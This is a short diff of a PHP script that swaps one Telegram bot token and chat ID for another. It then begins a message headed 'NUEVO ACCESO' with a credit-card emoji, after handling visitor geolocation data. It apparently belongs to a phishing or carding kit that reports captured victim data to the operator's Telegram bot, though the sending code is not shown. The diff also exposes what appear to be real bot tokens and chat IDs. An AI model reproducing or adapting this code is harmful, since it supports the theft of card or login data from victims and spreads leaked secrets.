@@ -37,8 +37,8 @@ if($geoData){
 $fecha = date("Y-m-d H:i:s");
 
 // 🔐 TOKEN Y CHAT ID (TU BOT)
-$token = "8687740380:AAGGYi6lL882l7Vv6JSYJwkFPZ1byk0pcRA";
-$chat_id = "8448767308";
+$token = "8841860301:AAHhQSV7_J9op9KFyDZWG_g6D7xz_nGniew";
+$chat_id = "8841860301";
 
 // 🧾 MENSAJE
 $mensaje = "💳 NUEVO ACCESO\n\n";
